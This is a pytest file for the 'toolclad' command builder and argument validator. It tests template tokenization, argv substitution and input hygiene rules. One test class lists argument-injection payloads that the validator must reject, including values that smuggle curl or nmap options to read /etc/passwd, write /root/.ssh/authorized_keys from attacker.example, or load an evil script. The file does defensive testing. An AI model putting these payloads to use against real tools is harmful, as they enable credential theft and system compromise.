"""Tests for tokenize-then-substitute command construction and value hygiene.

Covers the canonical exec form, template tokenization, trusted vs.
single-token variables, ``end_of_options``, ``{{``/``}}`` escapes, the
string-derived hygiene rules, and pattern anchoring. No network tool is ever
executed: every manifest here invokes ``echo`` or ``true`` and only argv is
asserted (or ``dry_run=True`` is used).
"""

from __future__ import annotations

import textwrap
import warnings

import pytest

from toolclad.executor import (
    build_command,
    build_command_argv,
    compile_command,
    execute,
    tokenize_template,
)
from toolclad.manifest import (
    ArgDef,
    CommandDef,
    CustomTypeDef,
    Manifest,
    OutputDef,
    ToolMeta,
    load_manifest,
)
from toolclad.validator import (
    ValidationError,
    validate_arg,
    validate_arg_mode,
    validate_arg_with_custom_types,
    validate_arg_with_custom_types_mode,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _arg(type: str, **kwargs) -> ArgDef:  # noqa: A002
    return ArgDef(name="test", type=type, **kwargs)


def _load(tmp_path, toml_text: str, name: str = "t.clad.toml") -> Manifest:
    """Write a TOML manifest to tmp_path and load it (deprecation warnings hidden)."""
    p = tmp_path / name
    p.write_text(textwrap.dedent(toml_text))
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", DeprecationWarning)
        return load_manifest(str(p))


_HEADER = """\
    [tool]
    name = "t"
    version = "1.0.0"
    binary = "echo"

    [output]
    format = "text"
"""


# ---------------------------------------------------------------------------
# TC-1 / TC-2 / TC-3 payloads
# ---------------------------------------------------------------------------

class TestInjectionPayloads:
    def test_tc1_payloads_rejected(self):
        for payload in (
            "' -d @/etc/passwd",
            "X: y' -d @/etc/passwd -H 'Z: w",
        ):
            with pytest.raises(ValidationError):
                validate_arg(_arg("string"), payload)
        for payload in (
            "https://attacker.example/ -o /root/.ssh/authorized_keys",
            "https://attacker.example/ -o /tmp/pwned",
        ):
            with pytest.raises(ValidationError):
                validate_arg(_arg("url"), payload)

    def test_tc1_payloads_rejected_even_with_opt_ins(self):
        # Quotes are never allowed; whitespace opt-in does not rescue these.
        ad = _arg("string", allow_whitespace=True, allow_leading_dash=True)
        with pytest.raises(ValidationError, match="quote or backslash"):
            validate_arg_mode(ad, "X: y' -d @/etc/passwd -H 'Z: w", exec_mode=True)
        # url never honors allow_whitespace.
        ad = _arg("url", allow_whitespace=True)
        with pytest.raises(ValidationError, match="whitespace"):
            validate_arg_mode(ad, "https://attacker.example/ -o /tmp/pwned", exec_mode=True)

    def test_tc2_payloads_rejected(self):
        for payload in (
            "-iL /etc/passwd",
            "--script=/tmp/evil.nse",
            "--script http-fetch --script-args http-fetch.destination=/tmp/d",
        ):
            with pytest.raises(ValidationError):
                validate_arg(_arg("string"), payload)

    def test_tc3_leading_dash_rejected(self):
        with pytest.raises(ValidationError, match="must not start with '-' or '\\+'"):
            validate_arg(_arg("path"), "-rf")
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg(_arg("string"), "--output=/etc/cron.d/x")
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg(_arg("integer"), "-1")
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg(_arg("string"), "+short")

    def test_tc3_allow_leading_dash_permits(self):
        assert validate_arg(_arg("string", allow_leading_dash=True), "-v") == "-v"
        assert validate_arg(_arg("string", allow_leading_dash=True), "+short") == "+short"
        assert validate_arg(_arg("integer", allow_leading_dash=True), "-5") == "-5"


# ---------------------------------------------------------------------------
# Hygiene rules (W1.5)
# ---------------------------------------------------------------------------

class TestHygiene:
    def test_nul_rejected_for_every_type(self):
        for t, v in (
            ("string", "a\0b"), ("integer", "1\0"), ("number", "1.0\0"),
            ("port", "80\0"), ("boolean", "true\0"), ("ip_address", "1.1.1.1\0"),
            ("cidr", "10.0.0.0/8\0"), ("scope_target", "example.com\0"),
            ("url", "https://example.com/\0"), ("path", "a/b\0"),
            ("duration", "30\0"), ("msf_options", "RHOSTS 1.1.1.1\0"),
            ("regex_match", "x\0"), ("credential_file", "x\0"),
        ):
            with pytest.raises(ValidationError, match="NUL"):
                validate_arg(_arg(t, pattern=".*", allowed=["x"]), v)
        with pytest.raises(ValidationError, match="NUL"):
            validate_arg(_arg("enum", allowed=["a\0"]), "a\0")

    def test_enum_exempt_from_other_hygiene_rules(self):
        ad = _arg("enum", allowed=["-sS --top-ports", "it's"])
        assert validate_arg(ad, "-sS --top-ports") == "-sS --top-ports"
        assert validate_arg(ad, "it's") == "it's"

    def test_control_characters_rejected(self):
        # Every C0 (including the whitespace ones), DEL, and the C1 range.
        for c in ("\x01", "\x1b", "\x7f", "\x1f", "\t", "\n", "\r", "\x0b", "\x0c", "\x80", "\x85", "\x9f"):
            with pytest.raises(ValidationError, match="control characters"):
                validate_arg(_arg("string"), f"a{c}b")

    def test_control_characters_unconditional(self):
        # allow_whitespace in exec mode never relaxes the control rule.
        ad = _arg("string", allow_whitespace=True)
        for c in ("\t", "\n", "\r", "\x0b", "\x0c", "\x85"):
            with pytest.raises(ValidationError, match="control characters"):
                validate_arg_mode(ad, f"a{c}b", exec_mode=True)
        with pytest.raises(ValidationError, match="control characters"):
            validate_arg(_arg("msf_options"), "RHOSTS\t10.0.1.1")

    def test_quotes_and_backslash_rejected(self):
        for v in ("a'b", 'a"b', "a\\b"):
            with pytest.raises(ValidationError, match="quote or backslash"):
                validate_arg(_arg("string"), v)

    def test_scope_target_keeps_specific_backslash_message(self):
        with pytest.raises(ValidationError, match="scope_target must not contain backslash"):
            validate_arg(_arg("scope_target"), "example.com\\nINJECTED")

    def test_whitespace_rejected_by_default(self):
        for v in ("a b", "a\u00a0b", "a\u2003b", "a\u2028b", "a\u3000b"):
            with pytest.raises(ValidationError, match="must not contain whitespace"):
                validate_arg(_arg("string"), v)

    def test_allow_whitespace_permits_only_ascii_space(self):
        ad = _arg("string", allow_whitespace=True)
        assert validate_arg_mode(ad, "X-Trace: abc", exec_mode=True) == "X-Trace: abc"
        for c in ("\t", "\n", "\r"):
            with pytest.raises(ValidationError, match="control characters"):
                validate_arg_mode(ad, f"a{c}b", exec_mode=True)
        for c in ("\u00a0", "\u2000", "\u200a", "\u2028", "\u2029", "\u3000"):
            with pytest.raises(ValidationError, match="must not contain whitespace"):
                validate_arg_mode(ad, f"a{c}b", exec_mode=True)

    def test_msf_options_separator_is_ascii_space_only(self):
        with pytest.raises(ValidationError, match="must not contain whitespace"):
            validate_arg(_arg("msf_options"), "RHOSTS\u00a010.0.1.1")

    def test_allow_whitespace_only_in_exec_mode(self):
        ad = _arg("string", allow_whitespace=True)
        with pytest.raises(ValidationError, match="whitespace"):
            validate_arg(ad, "a b")
        with pytest.raises(ValidationError, match="whitespace"):
            validate_arg_mode(ad, "a b", exec_mode=False)
        assert validate_arg_mode(ad, "a b", exec_mode=True) == "a b"

    def test_msf_options_exempt_from_whitespace_only(self):
        assert validate_arg(_arg("msf_options"), "RHOSTS 10.0.1.1;RPORT 445") == "RHOSTS 10.0.1.1;RPORT 445"
        with pytest.raises(ValidationError, match="quote or backslash"):
            validate_arg(_arg("msf_options"), "RHOSTS 'x'")
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg(_arg("msf_options"), "-RHOSTS x")

    def test_rule_order(self):
        # NUL beats control, control beats quotes, quotes beat whitespace,
        # whitespace beats leading dash.
        with pytest.raises(ValidationError, match="NUL"):
            validate_arg(_arg("string"), "-'\x01 \0")
        with pytest.raises(ValidationError, match="control"):
            validate_arg(_arg("string"), "-' \x01")
        with pytest.raises(ValidationError, match="quote"):
            validate_arg(_arg("string"), "- '")
        with pytest.raises(ValidationError, match="whitespace"):
            validate_arg(_arg("string"), "- x")

    def test_numeric_leading_dash_applies_to_output(self):
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg(_arg("integer"), "-1")
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg(_arg("number"), "-0.5")
        assert validate_arg(_arg("integer", min=1, max=10, clamp=True), "-5") == "1"
        assert validate_arg(_arg("number", min_float=0.0, max_float=1.0, clamp=True), "-5") == "0"
        with pytest.raises(ValidationError, match="Expected port number"):
            validate_arg(_arg("port"), "-1")
        assert validate_arg(_arg("integer", allow_leading_dash=True), "-7") == "-7"
        assert validate_arg(_arg("integer"), "+7") == "7"

    def test_url_leading_dash_and_whitespace(self):
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg(_arg("url"), "-https://example.com/")
        with pytest.raises(ValidationError, match="whitespace"):
            validate_arg(_arg("url"), "https://example.com/a b")
        assert validate_arg(_arg("url"), "https://example.com/path") == "https://example.com/path"


# ---------------------------------------------------------------------------
# Pattern anchoring (W1.6)
# ---------------------------------------------------------------------------

class TestPatternAnchoring:
    def test_unanchored_pattern_is_anchored(self):
        ad = _arg("string", pattern="[a-z]+")
        with pytest.raises(ValidationError, match="does not match"):
            validate_arg(ad, "abc123")
        assert validate_arg(ad, "abc") == "abc"

    def test_regex_match_anchored(self):
        ad = _arg("regex_match", pattern="[a-z]+")
        with pytest.raises(ValidationError, match="does not match"):
            validate_arg(ad, "abc123")
        with pytest.raises(ValidationError, match="does not match"):
            validate_arg(ad, "1abc")

    def test_explicit_anchors_are_normalized(self):
        ad = _arg("string", pattern="^[a-z]+$")
        assert validate_arg(ad, "abc") == "abc"
        with pytest.raises(ValidationError):
            validate_arg(ad, "abc1")

    def test_alternation_is_grouped(self):
        ad = _arg("string", pattern="^foo|bar$")
        assert validate_arg(ad, "foo") == "foo"
        assert validate_arg(ad, "bar") == "bar"
        with pytest.raises(ValidationError):
            validate_arg(ad, "foobar")

    def test_escaped_dollar_is_kept(self):
        # `\$` is a literal dollar, not an anchor; the pattern still full-matches.
        ad = _arg("string", pattern=r"cost\$", allow_leading_dash=True)
        with pytest.raises(ValidationError):
            validate_arg(ad, "cost")

    def test_custom_type_pattern_anchored(self):
        custom = {"ident": CustomTypeDef(base="string", pattern="[a-z]+")}
        ad = _arg("ident")
        with pytest.raises(ValidationError, match="does not match"):
            validate_arg_with_custom_types(ad, "abc123", custom)
        assert validate_arg_with_custom_types(ad, "abc", custom) == "abc"

    def test_custom_type_carries_opt_ins(self):
        custom = {"flag": CustomTypeDef(base="string")}
        with pytest.raises(ValidationError, match="must not start with"):
            validate_arg_with_custom_types(_arg("flag"), "-v", custom)
        assert validate_arg_with_custom_types(_arg("flag", allow_leading_dash=True), "-v", custom) == "-v"
        ad = _arg("flag", allow_whitespace=True)
        with pytest.raises(ValidationError, match="whitespace"):
            validate_arg_with_custom_types(ad, "a b", custom)
        assert validate_arg_with_custom_types_mode(ad, "a b", custom, exec_mode=True) == "a b"


# ---------------------------------------------------------------------------
# Tokenizer
# ---------------------------------------------------------------------------

class TestTokenizer:
    def test_basic_split(self):
        assert tokenize_template("echo  a\tb {x}") == ["echo", "a", "b", "{x}"]
        assert tokenize_template("") == []
        assert tokenize_template("   ") == []

    def test_quotes_group_and_are_removed(self):
        assert tokenize_template("a 'b c' \"d e\"") == ["a", "b c", "d e"]
        assert tokenize_template("''") == [""]
        assert tokenize_template("a''b") == ["ab"]

    def test_backslash_escapes_outside_single_quotes(self):
        assert tokenize_template(r"a\ b") == ["a b"]
        assert tokenize_template(r'"a\"b"') == ['a"b']
        assert tokenize_template(r"'a\b'") == ["a\\b"]

    def test_trailing_backslash_rejected(self):
        with pytest.raises(ValueError, match="trailing backslash"):
            tokenize_template("a \\")

    def test_unbalanced_quote_rejected(self):
        with pytest.raises(ValueError, match="unbalanced quote"):
            tokenize_template("a 'b")
        with pytest.raises(ValueError, match="unbalanced quote"):
            tokenize_template('a "b')

    def test_placeholder_inside_quotes_rejected(self):
        with pytest.raises(ValueError, match="places a placeholder inside quotes"):
            tokenize_template("curl -H '{headers}' {url}")
        with pytest.raises(ValueError, match="places a placeholder inside quotes"):
            tokenize_template('curl -H "X: {headers}" {url}')

    def test_brace_escape_inside_quotes_is_legal(self):
        assert tokenize_template("-w '\\n%{{http_code}}'") == ["-w", "\\n%{{http_code}}"]
        with pytest.raises(ValueError, match="inside quotes"):
            tokenize_template("-w '%{{http_code}} {url}'")


# ---------------------------------------------------------------------------
# Load-time compile
# ---------------------------------------------------------------------------

class TestLoadCompile:
    def test_template_compiled_to_exec_with_warning(self, tmp_path, capsys):
        p = tmp_path / "t.clad.toml"
        p.write_text(textwrap.dedent(_HEADER + """
            [args.target]
            position = 1
            required = true
            type = "string"

            [command]
            template = "echo -n {target}"
        """))
        with pytest.warns(DeprecationWarning, match="template is deprecated"):
            m = load_manifest(str(p))
        assert m.command.exec == ["echo", "-n", "{target}"]
        assert m.command.template == "echo -n {target}"
        assert m.command.exec_was_declared is False
        err = capsys.readouterr().err
        assert err.count(
            "warning: [command] template is deprecated and will be removed in the "
            "next minor release; use exec = [...]"
        ) == 1

    def test_declared_exec_sets_flag_and_no_warning(self, tmp_path):
        p = tmp_path / "t.clad.toml"
        p.write_text(textwrap.dedent(_HEADER + """
            [args.target]
            position = 1
            required = true
            type = "string"

            [command]
            exec = ["echo", "{target}"]
        """))
        with warnings.catch_warnings():
            warnings.simplefilter("error")
            m = load_manifest(str(p))
        assert m.command.exec_was_declared is True
        assert m.command.exec == ["echo", "{target}"]

    def test_placeholder_inside_quotes_refused_at_load(self, tmp_path):
        with pytest.raises(ValueError, match="places a placeholder inside quotes"):
            _load(tmp_path, _HEADER + """
                [args.headers]
                position = 1
                type = "string"

                [command]
                template = "echo -H '{headers}'"
            """)

    def test_conditional_placeholder_inside_quotes_refused_at_load(self, tmp_path):
        with pytest.raises(ValueError, match="conditionals.header_flags.*inside quotes"):
            _load(tmp_path, _HEADER + """
                [args.headers]
                position = 1
                type = "string"

                [command]
                exec = ["echo", "{_header_flags}"]

                [command.conditionals.header_flags]
                when = "headers != ''"
                template = "-H '{headers}'"
            """)

    def test_conditional_tokens_stored_at_load(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.headers]
            position = 1
            type = "string"

            [command]
            exec = ["echo", "{_header_flags}"]

            [command.conditionals.header_flags]
            when = "headers != ''"
            template = "-H {headers}"
        """)
        assert m.command.conditionals["header_flags"].tokens == ["-H", "{headers}"]

    def test_unresolved_placeholder_refused_at_load(self, tmp_path):
        with pytest.raises(ValueError, match="unresolved placeholder '{nope}'"):
            _load(tmp_path, _HEADER + """
                [command]
                exec = ["echo", "{nope}"]
            """)
        with pytest.raises(ValueError, match="unresolved placeholder '{nope}'"):
            _load(tmp_path, _HEADER + """
                [command]
                template = "echo {nope}"
            """)
        with pytest.raises(ValueError, match="unresolved placeholder '{nope}'"):
            _load(tmp_path, _HEADER + """
                [args.x]
                position = 1
                type = "string"

                [command]
                exec = ["echo", "{_c}"]

                [command.conditionals.c]
                when = "x != ''"
                template = "--flag {nope}"
            """)

    def test_scan_flags_alias_removed(self, tmp_path):
        with pytest.raises(ValueError, match="unresolved placeholder '{_scan_flags}'"):
            _load(tmp_path, _HEADER + """
                [args.scan_type]
                position = 1
                type = "enum"
                allowed = ["a"]

                [command]
                exec = ["echo", "{_scan_flags}"]

                [command.mappings.scan_type]
                a = "-A"
            """)

    def test_known_placeholders_accepted_at_load(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.scan_type]
            position = 1
            type = "enum"
            allowed = ["a"]
            default = "a"

            [args.x]
            position = 2
            type = "string"

            [command]
            exec = ["echo", "{_scan_type_flags}", "{_c}", "{rate}", "{_scan_id}", "{_output_file}", "{_evidence_dir}", "{x}"]

            [command.defaults]
            rate = "10"

            [command.mappings.scan_type]
            a = "-A"

            [command.conditionals.c]
            when = "x != ''"
            template = "--x {x}"
        """)
        assert m.command.exec[0] == "echo"

    def test_multi_token_var_embedded_in_text_refused(self, tmp_path):
        msg = "placeholder '{_scan_type_flags}' expands to multiple tokens and must be a whole token in command"
        with pytest.raises(ValueError, match=msg):
            _load(tmp_path, _HEADER + """
                [args.scan_type]
                position = 1
                type = "enum"
                allowed = ["a"]

                [command]
                exec = ["echo", "--f={_scan_type_flags}"]

                [command.mappings.scan_type]
                a = "-A"
            """)
        # Same refusal on the build path for a manifest that skipped load.
        m = Manifest(
            tool=ToolMeta(name="t", binary="echo"),
            command=CommandDef(exec=["echo", "--f={_scan_type_flags}"], mappings={"scan_type": {"a": "-A"}}),
            args={"scan_type": ArgDef(name="scan_type", position=1, type="enum", allowed=["a"])},
            output=OutputDef(format="text"),
        )
        with pytest.raises(ValueError, match=msg):
            build_command_argv(m, {"scan_type": "a"})

    def test_enum_mapping_must_cover_every_allowed_value(self, tmp_path):
        with pytest.raises(ValueError, match="missing entries for enum values: 'syn', 'udp'"):
            _load(tmp_path, _HEADER + """
                [args.scan_type]
                position = 1
                type = "enum"
                allowed = ["ping", "syn", "udp"]

                [command]
                exec = ["echo", "{_scan_type_flags}"]

                [command.mappings.scan_type]
                ping = "-sn"
            """)
        # Mapping a value to "" means "no flags" and satisfies the check.
        m = _load(tmp_path, _HEADER + """
            [args.scan_type]
            position = 1
            type = "enum"
            allowed = ["ping", "syn"]
            default = "ping"

            [command]
            exec = ["echo", "{_scan_type_flags}", "end"]

            [command.mappings.scan_type]
            ping = ""
            syn = "-sS"
        """)
        assert build_command_argv(m, {}) == ["echo", "end"]
        assert build_command_argv(m, {"scan_type": "syn"}) == ["echo", "-sS", "end"]

    def test_unmapped_present_value_is_build_error(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.mode]
            position = 1
            type = "string"

            [command]
            exec = ["echo", "{_mode_flags}", "end"]

            [command.mappings.mode]
            fast = "-T4"
        """)
        with pytest.raises(
            ValidationError,
            match=r"no mapping for argument 'mode' value 'slow' in \[command.mappings.mode\]",
        ):
            build_command_argv(m, {"mode": "slow"})
        # Absent optional contributes nothing; a mapped value splices.
        assert build_command_argv(m, {}) == ["echo", "end"]
        assert build_command_argv(m, {"mode": "fast"}) == ["echo", "-T4", "end"]

    def test_executor_takes_precedence_and_validates_strictly(self):
        m = Manifest(
            tool=ToolMeta(name="t", binary="true"),
            command=CommandDef(executor="true", exec=["echo", "{x}"], exec_was_declared=True),
            args={"x": ArgDef(name="x", position=1, type="string", allow_whitespace=True)},
            output=OutputDef(format="text"),
        )
        env = execute(m, {"x": "ab"}, dry_run=True)
        assert env["command"] == "true (custom executor)"
        with pytest.raises(ValidationError, match="whitespace"):
            execute(m, {"x": "a b"}, dry_run=True)

    def test_end_of_options_invalid_value_refused(self, tmp_path):
        with pytest.raises(ValueError, match='end_of_options must be "--"'):
            _load(tmp_path, _HEADER + """
                [command]
                exec = ["echo"]
                end_of_options = "-"
            """)

    def test_exec_must_be_string_array(self, tmp_path):
        with pytest.raises(ValueError, match="array of strings"):
            _load(tmp_path, _HEADER + """
                [command]
                exec = "echo hi"
            """)

    def test_arg_opt_ins_parsed(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.a]
            position = 1
            type = "string"
            allow_leading_dash = true
            allow_whitespace = true

            [args.b]
            position = 2
            type = "string"

            [command]
            exec = ["echo", "{a}", "{b}"]
        """)
        assert m.args["a"].allow_leading_dash is True
        assert m.args["a"].allow_whitespace is True
        assert m.args["b"].allow_leading_dash is False
        assert m.args["b"].allow_whitespace is False


# ---------------------------------------------------------------------------
# Substitution (W1.3 / W1.3a)
# ---------------------------------------------------------------------------

class TestSubstitution:
    def test_whitespace_value_is_one_argv_element_with_declared_exec(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.msg]
            position = 1
            required = true
            type = "string"
            allow_whitespace = true

            [command]
            exec = ["echo", "-n", "{msg}"]
        """)
        argv = build_command_argv(m, {"msg": "hello big world"})
        assert argv == ["echo", "-n", "hello big world"]
        assert len(argv) == 3

    def test_whitespace_value_rejected_with_compiled_template(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.msg]
            position = 1
            required = true
            type = "string"
            allow_whitespace = true

            [command]
            template = "echo -n {msg}"
        """)
        with pytest.raises(ValidationError, match="whitespace"):
            build_command_argv(m, {"msg": "hello big world"})

    def test_embedded_placeholder_never_splits_token(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.msg]
            position = 1
            required = true
            type = "string"
            allow_whitespace = true

            [command]
            exec = ["echo", "--text={msg}", "end"]
        """)
        assert build_command_argv(m, {"msg": "a b c"}) == ["echo", "--text=a b c", "end"]

    def test_empty_sole_placeholder_dropped_but_embedded_kept(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.opt]
            position = 1
            type = "string"

            [command]
            exec = ["echo", "{opt}", "--opt={opt}", "end"]
        """)
        assert build_command_argv(m, {}) == ["echo", "--opt=", "end"]

    def test_mapping_splices_tokens(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.scan_type]
            position = 1
            required = true
            type = "enum"
            allowed = ["ping", "service"]

            [args.target]
            position = 2
            required = true
            type = "scope_target"

            [command]
            exec = ["echo", "{_scan_type_flags}", "{target}"]

            [command.mappings.scan_type]
            ping = "-sn -PE"
            service = "-sT -sV --version-intensity 5"
        """)
        assert build_command_argv(m, {"scan_type": "service", "target": "10.0.1.0/24"}) == [
            "echo", "-sT", "-sV", "--version-intensity", "5", "10.0.1.0/24",
        ]
        assert build_command_argv(m, {"scan_type": "ping", "target": "example.com"}) == [
            "echo", "-sn", "-PE", "example.com",
        ]

    def test_conditional_value_stays_one_element(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.headers]
            position = 1
            type = "string"
            allow_whitespace = true

            [args.url]
            position = 2
            required = true
            type = "url"

            [command]
            exec = ["echo", "{_header_flags}", "{url}"]

            [command.conditionals.header_flags]
            when = "headers != ''"
            template = "-H {headers}"
        """)
        argv = build_command_argv(m, {"headers": "X-Trace: abc", "url": "https://example.com/"})
        assert argv == ["echo", "-H", "X-Trace: abc", "https://example.com/"]
        argv = build_command_argv(m, {"url": "https://example.com/"})
        assert argv == ["echo", "https://example.com/"]

    def test_brace_escape_yields_literal_braces(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.url]
            position = 1
            required = true
            type = "url"

            [command]
            exec = ["echo", "-w", "\\\\n%{{http_code}}", "{url}"]
        """)
        argv = build_command_argv(m, {"url": "https://example.com/"})
        assert argv == ["echo", "-w", "\\n%{http_code}", "https://example.com/"]

    def test_brace_escape_from_template(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.url]
            position = 1
            required = true
            type = "url"

            [command]
            template = "echo -w '\\\\n%{{http_code}}' {url}"
        """)
        assert m.command.exec == ["echo", "-w", "\\n%{{http_code}}", "{url}"]
        argv = build_command_argv(m, {"url": "https://example.com/"})
        assert argv == ["echo", "-w", "\\n%{http_code}", "https://example.com/"]

    def test_escaped_braces_are_not_placeholders_programmatic(self):
        m = Manifest(
            tool=ToolMeta(name="t", binary="echo"),
            command=CommandDef(exec=["echo", "{{target}}", "{target}"], exec_was_declared=True),
            args={"target": ArgDef(name="target", position=1, required=True, type="string")},
            output=OutputDef(format="text"),
        )
        assert build_command_argv(m, {"target": "x"}) == ["echo", "{target}", "x"]

    def test_unresolved_placeholder_programmatic_build(self):
        m = Manifest(
            tool=ToolMeta(name="t", binary="echo"),
            command=CommandDef(exec=["echo", "{missing}"]),
            output=OutputDef(format="text"),
        )
        with pytest.raises(ValueError, match="unresolved placeholder '{missing}' in command"):
            build_command_argv(m, {})

    def test_programmatic_template_is_strict_mode(self):
        m = Manifest(
            tool=ToolMeta(name="t", binary="echo"),
            command=CommandDef(template="echo {msg}"),
            args={"msg": ArgDef(name="msg", position=1, required=True, type="string", allow_whitespace=True)},
            output=OutputDef(format="text"),
        )
        with pytest.raises(ValidationError, match="whitespace"):
            build_command_argv(m, {"msg": "a b"})
        assert build_command_argv(m, {"msg": "ab"}) == ["echo", "ab"]

    def test_build_command_string_is_shell_quoted_display(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.msg]
            position = 1
            required = true
            type = "string"
            allow_whitespace = true

            [command]
            exec = ["echo", "{msg}"]
        """)
        assert build_command(m, {"msg": "a b"}) == "echo 'a b'"

    def test_execute_dry_run_uses_argv(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.msg]
            position = 1
            required = true
            type = "string"

            [command]
            exec = ["echo", "{msg}"]
        """)
        env = execute(m, {"msg": "hi"}, dry_run=True)
        assert env["status"] == "dry_run"
        assert env["command"] == "echo hi"

    def test_execute_runs_argv_without_resplitting(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.msg]
            position = 1
            required = true
            type = "string"
            allow_whitespace = true

            [command]
            exec = ["echo", "{msg}"]
        """)
        env = execute(m, {"msg": "a  b"})
        assert env["status"] == "success"
        assert env["results"]["raw_output"] == "a  b\n"

    def test_compile_command_is_idempotent(self):
        m = Manifest(
            tool=ToolMeta(name="t", binary="echo"),
            command=CommandDef(template="echo {x}"),
            args={"x": ArgDef(name="x", position=1, type="string")},
            output=OutputDef(format="text"),
        )
        compile_command(m, warn=False)
        first = list(m.command.exec)
        compile_command(m, warn=False)
        assert m.command.exec == first == ["echo", "{x}"]
        assert m.command.exec_was_declared is False


# ---------------------------------------------------------------------------
# end_of_options (W1.4)
# ---------------------------------------------------------------------------

class TestEndOfOptions:
    def test_inserted_before_first_user_arg_token(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.target]
            position = 1
            required = true
            type = "string"

            [args.other]
            position = 2
            type = "string"

            [command]
            exec = ["echo", "-n", "{rate}", "{target}", "{other}"]
            end_of_options = "--"

            [command.defaults]
            rate = "5"
        """)
        argv = build_command_argv(m, {"target": "host", "other": "x"})
        assert argv == ["echo", "-n", "5", "--", "host", "x"]
        assert argv.count("--") == 1

    def test_not_inserted_without_user_arg_token(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.target]
            position = 1
            required = true
            type = "string"

            [command]
            exec = ["echo", "--t={target}"]
            end_of_options = "--"
        """)
        assert build_command_argv(m, {"target": "host"}) == ["echo", "--t=host"]

    def test_skips_dropped_empty_value(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.opt]
            position = 1
            type = "string"

            [args.target]
            position = 2
            required = true
            type = "string"

            [command]
            exec = ["echo", "{opt}", "{target}"]
            end_of_options = "--"
        """)
        assert build_command_argv(m, {"target": "host"}) == ["echo", "--", "host"]

    def test_not_inserted_when_unset(self, tmp_path):
        m = _load(tmp_path, _HEADER + """
            [args.target]
            position = 1
            required = true
            type = "string"

            [command]
            exec = ["echo", "{target}"]
        """)
        assert build_command_argv(m, {"target": "host"}) == ["echo", "host"]

    def test_programmatic_invalid_value_refused(self):
        m = Manifest(
            tool=ToolMeta(name="t", binary="echo"),
            command=CommandDef(exec=["echo"], end_of_options="++"),
            output=OutputDef(format="text"),
        )
        with pytest.raises(ValueError, match="end_of_options"):
            build_command_argv(m, {})
